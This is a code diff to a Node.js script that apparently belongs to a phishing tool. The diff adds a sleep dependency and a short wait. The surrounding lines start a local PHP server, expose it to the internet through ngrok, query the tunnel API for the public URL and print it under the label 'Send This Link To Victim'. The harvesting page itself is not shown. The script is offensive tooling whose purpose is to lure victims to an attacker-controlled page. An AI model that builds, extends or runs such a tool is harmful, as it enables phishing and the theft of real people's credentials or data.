@@ -12,6 +12,7 @@ var style = require("chalk");
 var notif = require("beeper");
 var check = require("log-symbols")
 var cow = require("cowsay")
+var s = require('sleep')
 
 // Cowsay :)
 console.log(cow.say({
@@ -37,6 +38,10 @@ cmd.exec("php -S 127.0.0.1:3200 > /dev/null 2>&1 & ");
 // Make online php server by port forwarding
 cmd.exec("./ngrok http 3200 > /dev/null 2>&1 &");
 
+console.log(style.bgBlue("[/] Please Wait... :)"))
+
+
+s.sleep(5)
 // Tell user if server already start
 console.log(c.blue("[ Send This Link To Victim ] > " + cmd.exec("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")));
 
